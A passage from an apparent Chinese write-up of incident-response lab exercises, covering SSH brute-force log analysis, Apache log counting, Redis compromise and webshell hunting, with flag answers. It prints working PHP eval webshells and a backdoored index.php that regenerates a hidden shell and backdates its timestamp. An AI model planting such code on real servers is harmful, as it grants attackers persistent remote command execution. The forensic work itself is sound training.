/1.php HTTP/1.1&quot;</span> 200 21541 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span><br>192.168.200.2 - - [02/Aug/2023:01:42:19 +0000] <span class="hljs-string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 492 <br>...<br>192.168.200.2 - - [02/Aug/2023:08:56:10 +0000] <span class="hljs-string">&quot;GET /wap/top.php?fuc=ERsDHgEUC1hI&amp;func2=ser HTTP/1.1&quot;</span> 500 185 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span><br>192.168.200.2 - - [02/Aug/2023:08:56:24 +0000] <span class="hljs-string">&quot;GET /wap/top.php?fuc=ERsDHgEUC1hI&amp;func2=sert HTTP/1.1&quot;</span> 200 <br>...<br></code></pre></td></tr></table></figure>
<p>查找具体位置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-4:~# find / -name <span class="hljs-string">&quot;top.php&quot;</span> 2&gt;/dev/null<br><br>/var/www/html/wap/top.php<br>/var/www/html/data/tplcache/top.php<br></code></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">/<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/wap/<span class="hljs-attribute">top</span><span class="hljs-selector-class">.php</span><br>EEFF2EABFD9B7A6D26FC1A53D3F7D1DE<br></code></pre></td></tr></table></figure>
<h1 id="第一章-应急响应-linux日志分析"><a class="markdownIt-Anchor" href="#第一章-应急响应-linux日志分析"></a> 第一章 应急响应-Linux日志分析</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.有多少IP在爆破主机ssh的root帐号，如果有多个使用&quot;,&quot;分割<br>2.ssh爆破成功登陆的IP是多少，如果有多个使用&quot;,&quot;分割<br>3.爆破用户名字典是什么？如果有多个使用&quot;,&quot;分割<br>4.登陆成功的IP共爆破了多少次<br>5.黑客登陆主机后新建了一个后门用户，用户名是多少<br></code></pre></td></tr></table></figure>
<h2 id="q1-2"><a class="markdownIt-Anchor" href="#q1-2"></a> Q1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure>
<p><code>awk</code> 用来打印每行的第 11 列。通常，认证日志中的第 11 列会是登录尝试的源 IP 地址（具体列号可能根据日志格式而有所不同）。</p>
<p><code>uniq</code> 用来去除重复的 IP 地址，并且 <strong><code>-c</code></strong> 选项会在每个唯一的 IP 地址前加上出现次数，表示该 IP 地址失败登录的次数。</p>
<p>对 <code>uniq -c</code> 输出的结果按次数进行降序排序（<strong><code>-n</code></strong> 表示数值排序，<strong><code>-r</code></strong> 表示降序排序）。这样最多尝试失败的 IP 地址会排在最前面。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:/var/log# <span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br>      4 192.168.200.2<br>      1 192.168.200.32<br>      1 192.168.200.31<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>,<span class="hljs-number">192.168.200.31</span>,<span class="hljs-number">192.168.200.32</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-2"><a class="markdownIt-Anchor" href="#q2-2"></a> Q2</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted &quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure>
<p>同Q1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:/var/log# <span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted &quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br>      2 192.168.200.2<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.200.2</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q3-2"><a class="markdownIt-Anchor" href="#q3-2"></a> Q3</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure>
<p>使用 <code>perl</code> 提取源 IP 地址<code>while($_=&lt;&gt;)&#123;&#125;</code>：读取每一行日志</p>
<p><code>/for(.*?) from/</code>：正则表达式匹配 “for” 和 “from” 之间的内容（即源 IP 地址）。</p>
<p><code>print &quot;$1\n&quot;</code>：输出匹配到的 IP 地址</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">root@ip-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">10</span>-<span class="hljs-number">1</span>:/var/log<span class="hljs-comment"># cat auth.log.1 | grep -a &quot;Failed password&quot; |perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br>      <span class="hljs-number">5</span>  invalid <span class="hljs-keyword">user</span> <span class="hljs-title">user</span><br>      <span class="hljs-number">5</span>  invalid <span class="hljs-keyword">user</span> <span class="hljs-title">hello</span><br>      <span class="hljs-number">5</span>  invalid <span class="hljs-keyword">user</span> <br>      <span class="hljs-title">4</span>  root<br>      <span class="hljs-number">1</span>  root<br>      <span class="hljs-number">1</span>  root<br>      <span class="hljs-number">1</span>  invalid <span class="hljs-keyword">user</span> <span class="hljs-title">test3</span><br>      <span class="hljs-number">1</span>  invalid <span class="hljs-keyword">user</span> <span class="hljs-title">test2</span><br>      <span class="hljs-number">1</span>  invalid <span class="hljs-keyword">user</span> <span class="hljs-title">test1</span><br></code></pre></td></tr></table></figure>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">flag&#123;<span class="hljs-keyword">user</span>,hello,root,test3,test2,test1&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-2"><a class="markdownIt-Anchor" href="#q4-2"></a> Q4</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">4<br></code></pre></td></tr></table></figure>
<h2 id="q5"><a class="markdownIt-Anchor" href="#q5"></a> Q5</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-1:/var/log# <span class="hljs-built_in">cat</span> auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br>Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh<br>Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash<br></code></pre></td></tr></table></figure>
<p>还是感叹一下peterpan师傅，在上学的最后一年给全网留下了一份比较完善详细的玄机靶场的wp</p>
<h1 id="第一章-应急响应-linux入侵排查"><a class="markdownIt-Anchor" href="#第一章-应急响应-linux入侵排查"></a> 第一章 应急响应- Linux入侵排查</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.web目录存在木马，请找到木马的密码提交<br>2.服务器疑似存在不死马，请找到不死马的密码提交<br>3.不死马是通过哪个文件生成的，请提交文件名<br>4.黑客留下了木马文件，请找出黑客的服务器ip提交<br>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交<br></code></pre></td></tr></table></figure>
<h2 id="q1-3"><a class="markdownIt-Anchor" href="#q1-3"></a> Q1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:~# find / -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> grep -Hn <span class="hljs-string">&quot;eval(&quot;</span> &#123;&#125; \; 2&gt;/dev/null<br>/var/www/html/.shell.php:1:&lt;?php <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>])==<span class="hljs-string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&#125;?&gt;<br>/var/www/html/index.php:17:<span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br>/var/www/html/1.php:1:&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-3"><a class="markdownIt-Anchor" href="#q2-3"></a> Q2</h2>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">5d</span>41402abc4b2a76b9719d9<span class="hljs-number">11017c592</span><br>hello<br></code></pre></td></tr></table></figure>
<h2 id="q3-3"><a class="markdownIt-Anchor" href="#q3-3"></a> Q3</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:~# <span class="hljs-built_in">cat</span> /var/www/html/index.php<br>&lt;?php<br>include(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br>include(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.str_replace(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$path</span>, 0,1)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=substr(<span class="hljs-variable">$path</span>,1);<br>&#125;<br><span class="hljs-variable">$path</span> = Base::safeword(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        Index::createhtml(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:0,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        Index::run(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br>file_put_contents(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br>system(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br>usleep(3000);<br>?&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag&#123;<span class="hljs-keyword">index</span>.php&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-3"><a class="markdownIt-Anchor" href="#q4-3"></a> Q4</h2>
<p>先查找一下有无暴力痕迹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&quot;shell.php&quot;</span> /var/log/auth.log.1<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> auth.log.1 |grep <span class="hljs-string">&quot;Accepted password&quot;</span><br></code></pre></td></tr></table></figure>
<p>去看一下有无文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:~# <span class="hljs-built_in">cd</span> /var/www/html/<br>root@ip-10-0-10-7:/var/www/html# <span class="hljs-built_in">ls</span><br> 1.php   admin     config.php   favicon.ico   index.php     LICENSE    README.md  <span class="hljs-string">&#x27;shell(1).elf&#x27;</span>   template<br> 1.tar   api.php   data         include       install.php   pictures   rss.php     sitemap.php     wap<br></code></pre></td></tr></table></figure>
<p>提权运行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-7:/var/www/html# <span class="hljs-built_in">chmod</span> 777 <span class="hljs-string">&quot;shell(1).elf&quot;</span><br>root@ip-10-0-10-7:/var/www/html# <br>root@ip-10-0-10-7:/var/www/html# ./<span class="hljs-string">&#x27;shell(1).elf&#x27;</span><br></code></pre></td></tr></table></figure>
<p>再开一个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Last login: Mon Mar  3 12:51:04 2025 from 58.218.234.99<br>root@ip-10-0-10-7:~# netstat -antlp | more<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    <br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      571/mysqld          <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      507/sshd            <br>tcp        0      0 10.0.10.7:22            58.218.234.99:41753     ESTABLISHED 619/sshd: root@pts/ <br>tcp        0     68 10.0.10.7:22            58.218.234.99:50301     ESTABLISHED 1034/sshd: root@pts <br>tcp        0      1 10.0.10.7:44194         10.11.55.21:3333        SYN_SENT    1051/./shell(1).elf <br>tcp6       0      0 :::80                   :::*                    LISTEN      631/apache2         <br>tcp6       0      0 :::22                   :::*                    LISTEN      507/sshd      <br></code></pre></td></tr></table></figure>
<p>显示系统当前的网络连接状态，包括监听端口等信息，并使用 <code>more</code> 分页查看输出结果。参数含义如下：</p>
<ul>
<li><code>-a</code>：显示所有套接字，包括监听和非监听状态。</li>
<li><code>-n</code>：以数字形式显示地址和端口，而不是尝试解析主机名。</li>
<li><code>-t</code>：仅显示 TCP 连接。</li>
<li><code>-l</code>：仅显示正在监听的套接字。</li>
<li><code>-p</code>：显示所属进程的 PID 和进程名。</li>
<li><code>| more</code>：分页查看输出，适合结果过长时阅读。</li>
</ul>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.11.55.21</span><br></code></pre></td></tr></table></figure>
<h2 id="q5-2"><a class="markdownIt-Anchor" href="#q5-2"></a> Q5</h2>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure>
<h1 id="第二章日志分析-apache日志分析"><a class="markdownIt-Anchor" href="#第二章日志分析-apache日志分析"></a> 第二章日志分析-apache日志分析</h1>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1、提交当天访问次数最多的IP，即黑客IP：<br>2、黑客使用的浏览器指纹是什么，提交指纹的md5：<br>3、查看包含index.php页面被访问的次数，提交次数：<br>4、查看黑客IP访问了多少次，提交次数：<br>5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:<br></code></pre></td></tr></table></figure>
<h2 id="q1-4"><a class="markdownIt-Anchor" href="#q1-4"></a> Q1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-5:/var/log/apache2# <span class="hljs-built_in">cat</span> access.log.1 <br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | <span class="hljs-built_in">head</span> -n 1<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-5:/var/log/apache2# <span class="hljs-built_in">cat</span> access.log.1 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | <span class="hljs-built_in">head</span> -n 1<br>   6555 192.168.200.2<br></code></pre></td></tr></table></figure>
<h2 id="q2-4"><a class="markdownIt-Anchor" href="#q2-4"></a> Q2</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access.log.1 |grep 192.168.200.2 |more<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">87</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4280</span>.<span class="hljs-number">88</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">2D6330F380F44AC20F3A02EED0958F66</span><br></code></pre></td></tr></table></figure>
<h2 id="q3-4"><a class="markdownIt-Anchor" href="#q3-4"></a> Q3</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-5:/var/log/apache2# grep <span class="hljs-string">&quot;/index.php&quot;</span> access.log.1 | <span class="hljs-built_in">wc</span> -l<br>27<br></code></pre></td></tr></table></figure>
<h2 id="q4-4"><a class="markdownIt-Anchor" href="#q4-4"></a> Q4</h2>
<p>同Q1</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">6555</span><br></code></pre></td></tr></table></figure>
<h2 id="q5-3"><a class="markdownIt-Anchor" href="#q5-3"></a> Q5</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-5:/var/log/apache2# grep <span class="hljs-string">&quot;03/Aug/2023:08:&quot;</span> access.log.1 | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> | <span class="hljs-built_in">wc</span> -l <br>5<br></code></pre></td></tr></table></figure>
<h1 id="第二章日志分析-redis应急响应"><a class="markdownIt-Anchor" href="#第二章日志分析-redis应急响应"></a> 第二章日志分析-redis应急响应</h1>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm">通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客攻击成功的 <span class="hljs-built_in">IP</span> 为多少,将黑客 <span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br>通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交<span class="hljs-comment">;</span><br>通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客反弹 shell 的<span class="hljs-built_in">IP</span> 为多少,将反弹 shell 的<span class="hljs-built_in">IP</span> 作为 FLAG 提交<span class="hljs-comment">;</span><br>通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交<br>通过本地 <span class="hljs-built_in">PC</span> SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<h2 id="q1-5"><a class="markdownIt-Anchor" href="#q1-5"></a> Q1</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:/var/log# <span class="hljs-built_in">cat</span> redis.log<br>5417:C 31 Jul 2023 05:11:00.391 <span class="hljs-comment"># oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo</span><br>5417:C 31 Jul 2023 05:11:00.391 <span class="hljs-comment"># Redis version=5.0.1, bits=64, commit=00000000, modified=0, pid=5417, just started</span><br>5417:C 31 Jul 2023 05:11:00.391 <span class="hljs-comment"># Configuration loaded</span><br>5417:M 31 Jul 2023 05:11:00.392 * Increased maximum number of open files to 10032 (it was originally <span class="hljs-built_in">set</span> to 1024).<br>                _._                                                  <br>           _.-``__ <span class="hljs-string">&#x27;&#x27;</span>-._                                             <br>      _.-``    `.  `_.  <span class="hljs-string">&#x27;&#x27;</span>-._           Redis 5.0.1 (00000000/0) 64 bit<br>  .-`` .-```.  ```\/    _.,_ <span class="hljs-string">&#x27;&#x27;</span>-._                                   <br></code></pre></td></tr></table></figure>
<p>redis版本是5.0.1，而redis的未授权访问漏洞的影响范围是在Redis &lt;=5.0.5</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-0-10-9:/etc/redis# <span class="hljs-built_in">cat</span> redis.conf |grep <span class="hljs-string">&quot;require&quot;</span><br><span class="hljs-comment"># If the master is password protected (using the &quot;requirepass&quot; configuration</span><br><span class="hljs-comment"># For example to require at least 3 replicas with a lag &lt;= 10 seconds use:</span><br><span class="hljs-comment"># requirepass foobared</span><br></code></pre></td></tr></table></figure>
<p>这条配置是被注释掉的（前面的 <code>#</code> 号表示注释）。这意味着<strong>Redis 没有设置密码保护</strong>，任何能访问这个 Redis 服务器的用户都可以直接执行命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/redis.log<br>419:S 31 Jul 2023 05:33:27.636 <span class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br>419:S 31 Jul 2023 05:33:28.637 * Connecting to MASTER 192.168.100.13:8888<br>419:S 31 Jul 2023 05:33:28.637 * MASTER &lt;-&gt; REPLICA <span class="hljs-built_in">sync</span> started<br>419:S 31 Jul 2023 05:33:28.638 <span class="hljs-comment"># Error condition on socket for SYNC: Connection refused</span><br>419:S 31 Jul 2023 05:33:29.639 * Connecting to MASTER 192.168.100.13:8888<br>419:S 31 Jul 2023 05:33:29.639 * MASTER &lt;-&gt; REPLICA <span class="hljs-built_in">sync</span> started<br>419:S 31 Jul 2023 05:33:29.640 <span 